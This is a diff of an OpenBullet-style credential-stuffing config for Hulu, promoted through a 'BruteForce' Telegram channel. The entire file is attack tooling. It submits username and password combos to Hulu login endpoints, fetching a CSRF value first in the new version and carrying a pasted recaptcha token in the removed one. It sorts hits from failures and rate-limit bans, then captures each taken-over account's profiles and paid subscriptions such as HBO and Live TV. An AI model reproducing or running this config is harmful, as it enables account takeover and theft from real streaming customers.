@@ -3,7 +3,7 @@
   "Name": "Hulu",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2021-08-21T02:17:50.3480352+04:30",
+  "LastModified": "2020-09-13T18:10:01.5765748+04:30",
   "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Free To Custom | CPM Rate: 100-1500",
   "RequiredPlugins": [],
   "Author": "@TheOwn",
@@ -35,63 +35,65 @@
 }
 
 [SCRIPT]
-BEGIN SCRIPT JavaScript
-function uuidv4() {
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
-    return v.toString(16);
-  });
-}
-var g1 = uuidv4();
-END SCRIPT -> VARS "g1"
-
-#id FUNCTION ToUppercase "<g1>" -> VAR "id" 
-
-REQUEST POST "https://auth.hulu.com/v1/mobile/password/authenticate?language=en&device_context_id=iOS" 
-  CONTENT "user_email=<USER>&password=<PASS>&serial_number=<id>&device_id=176&friendly_name=IPhone&screen_size={\"device_type_identifier\":\"iPhone9,3\"}&additional_properties={\"device_manufacturer\":\"Apple\",\"app_version\":\"Hulu 7.23.1\",\"device_type\":\"Phone\",\"device_family\":\"iOS\",\"distro\":\"Apple\",\"limit_ad_tracking\":\"true\",\"build_number\":\"572\",\"device_ad_id\":\"00000000-0000-0000-0000-000000000000\",\"device_product\":\"iPhone\",\"device_platform\":\"iOS\",\"device_model\":\"iPhone9,3\",\"device_capabilities\":{\"device\":{\"hulu:app:ios\":\"7.23.1\",\"hulu:platform:apple:ios\":\"14.5.1\",\"hulu:devices:apple:iphone9,3\":\"\"},\"capabilities\":[]},\"source_id\":\"37946A0A-A8F6-4C78-82CD-D3B851A6EDEF\",\"device_os\":\"iOS 14.5.1\"}&time_zone=Asia/Kolkata&recaptcha_type=ios&recaptcha_token=03AGdBq26UGPo0gAkE_g2JgNDReDOIGkHVTME-3ZPCyNwV8YSj-pT2iyqCteRmwd6laWw2uGZYYKf9juQCRLYsBNhA6vx5bFNmYYb9k_CDUDRh5OZv03hB8d4qXnLV2thrW8OopdWIFP2kTx94ZLf60VcNeRBCz3GIzSlvOZpIW0JbgeVTmfjumrrc66IqSAfj1kxh_r5VKYlNMWkiftuCOXYuCACARiWXzOZAGQSzwdUita0BmIluAdJcxMDmMu_khpFUbWEMDQcst_eO_4wBha3xeQPEE-Jm8fmV1_IVQMQsoy4sYstRBwO5qETm1EhewqPjuiW8wixVBHwOOXrjHP-KinD-8npyvqCEKvT_j9rpEo-AlqsNXVNkfu3Qg-FZKjbtmMWhZ5NizkG4a_8Udo7Q3T8xkz6ZCcIxLA-SrgYvWy9qF5zc64qUaka5XqZ_30FjzNx1JHeOS0t0fp50tjVZqASW9Wlp2-OKDfl-7sT9xFPOtgFBQrBJq1FFIxgHgpRpI9VILww1haVYjSFRD4Qv8xu09GFxlPgceTKogqwd4RJIyl3YP2VxSV5dda83--getDxW7PIwn3M1qGnxl_s81pO1BYzZBrzC0wHp6LzL642-RnDlHCmw_vbiFjPySsZ1PZosftZYM0GLrVHvIR5a7bpOJhclPxht3oom5w540VKEyEeikocXAvKYXrtLMb0UOJD7SSGFSsKYSFqOGSc7Xkx9QzYHPLsWHNsC9PNze_lc3mmIWFU5ESwG92rNyP7L0o5cGAh83nWU4VnSH5TqQgVq69Z7i3ee_gk4trcmm0tUX0fIa-E2hOKAwIK1PI-LqVIdl-uK9SqHmRdc2dHjNCxJ9qPf46eQUQ57PgrVNF4aLoexwMMYjUihmugEmxjiSV56ZrQU0A_N6BgiXykIForvN7NRbJHtqkmAOD_DyaNe6-V19sfKLrITEQKwxiWskszRfcujHEcs2ZHuFUc8OfQjDgLy1hixkcPOeRC5nG-U3psxrRe0R_-Zr_2jETNKWdNEv4wEiRGMxTE74RPhcB1ibKvKD0ZP1yNIYhnpXJuHp1MOm0LtWoKmgdsxqwsT1y54qKqSLSNsx2b7p4vo1_OW3YcAMgbHpDzuSd9dFQ7RCTsoDQyuoqUeSrETp19XieNHbAWfMtrs5zxm-DltWa2otGMMea6WDuSkbYRKy126YtPCXMbG4jPCRaNRc0CWAWMdUpjODBhErxoAXxabIiF8l3iGJhabAmcgnAjdOZNfUSPRAH4" 
-  CONTENTTYPE "application/x-www-form-urlencoded" 
-  HEADER "Host: auth.hulu.com" 
-  HEADER "Content-Type: application/x-www-form-urlencoded" 
+#GetCSRF REQUEST GET "https://secure.hulu.com/api/3.0/generate_csrf_value?for_hoth=true&path=/v2/web/password/authenticate" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
-  HEADER "Accept-Language: en-us" 
-  HEADER "Accept-Encoding: gzip, deflate, br" 
-  HEADER "Connection: keep-alive" 
-  HEADER "X-NewRelic-ID: VQIHUVBSCRABXVlUDwADUFw=" 
-  HEADER "User-Agent: Hulu/7.23.1 (iOS 14.5.1; en_US; iPhone9,3; 18E212)" 
-  HEADER "X-Hulu-Request-Id: C2D6D694-680C-4B1E-BC3B-2C723FDF3650" 
-  HEADER "X-Hulu-User-Agent: Hulu/7.23.1 (iOS 14.5.1; en_US; iPhone9,3; 18E212)" 
+
+#csrf PARSE "<COOKIES(_tcv)>" LR "" "" -> VAR "csrf" 
+
+#Post REQUEST POST "https://auth.hulu.com/v2/web/password/authenticate" 
+  CONTENT "csrf=<csrf>&user_email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
 
 KEYCHECK 
   KEYCHAIN Success OR 
-    KEY "device_token" 
+    KEY "{}" 
   KEYCHAIN Failure OR 
-    KEY "login is invalid. Please try again" 
+    KEY "Your login is invalid" 
+  KEYCHAIN Ban OR 
+    KEY "retry_limit" 
 
-PARSE "<SOURCE>" JSON "user_token" -> VAR "TK" 
-
-REQUEST GET "https://home.hulu.com/v1/users/self?action=login&language=en&device_context_id=iOS" 
+#GetCap REQUEST GET "https://home.hulu.com/v1/users/self" 
   
-  HEADER "Host: home.hulu.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
-  HEADER "Accept-Language: en-us" 
-  HEADER "Accept-Encoding: gzip, deflate, br" 
-  HEADER "Connection: keep-alive" 
-  HEADER "X-NewRelic-ID: VQIHUVBSCRABXVlUDwADUFw=" 
-  HEADER "User-Agent: Hulu/7.23.1 (iOS 14.5.1; en_US; iPhone9,3; 18E212)" 
-  HEADER "X-Hulu-Request-Id: 79768AB9-D71C-410C-96CD-B48F3C5B4B10" 
-  HEADER "X-Hulu-User-Agent: Hulu/7.23.1 (iOS 14.5.1; en_US; iPhone9,3; 18E212)" 
-  HEADER "Authorization: Bearer <TK>" 
 
-PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "Name" 
+#Profiles PARSE "<SOURCE>" JSON "name" Recursive=TRUE -> CAP "Profiles" 
 
-PARSE "<SOURCE>" LR "is_kids\":" "," CreateEmpty=FALSE -> CAP "isKids" 
+#KIR PARSE "<SOURCE>" LR "\"feature_ids\":[" "]" -> VAR "KIR" "[" "]" 
 
-PARSE "<SOURCE>" LR "profile_limit\":" "," CreateEmpty=FALSE -> CAP "profile_limit" 
-
-PARSE "<SOURCE>" LR "region\":\"" "\"" CreateEmpty=FALSE -> CAP "region" 
+#Sub PARSE "<SOURCE>" LR "\"package_ids\":[" "]" -> VAR "Sub" "[" "]" 
 
 KEYCHECK BanOnToCheck=FALSE 
-  KEYCHAIN Custom "CUSTOM" OR 
-    KEY "<Features>" EqualTo "" 
-    KEY "<Subscriptions>" EqualTo "" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"package_ids\":[]" 
+
+#Features FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "1" VALUE "Noah" 
+  KEY "2" VALUE "Unlimited Screens" 
+  KEY "3" VALUE "Enhanced Cloud" 
+  KEY "4" VALUE "PSL" 
+  KEY "5" VALUE "Multi Stream" 
+  KEY "6" VALUE "Live Stream" 
+  KEY "7" VALUE "Lunchbox" 
+  "<KIR>" -> CAP "Features" 
+
+#Subscriptions FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "14" VALUE "No Commercials" 
+  KEY "15" VALUE "Showtime" 
+  KEY "16" VALUE "Live TV" 
+  KEY "17" VALUE "HBO" 
+  KEY "18" VALUE "Cinemax" 
+  KEY "19" VALUE "Starz" 
+  KEY "21" VALUE "Entertainment" 
+  KEY "23" VALUE "Spanish Add-on" 
+  "<Sub>" -> CAP "Subscriptions" 
+  
+  #CC FUNCTION Constant " T.me/BruteForce " -> CAP "Telegram Channel:" 
 
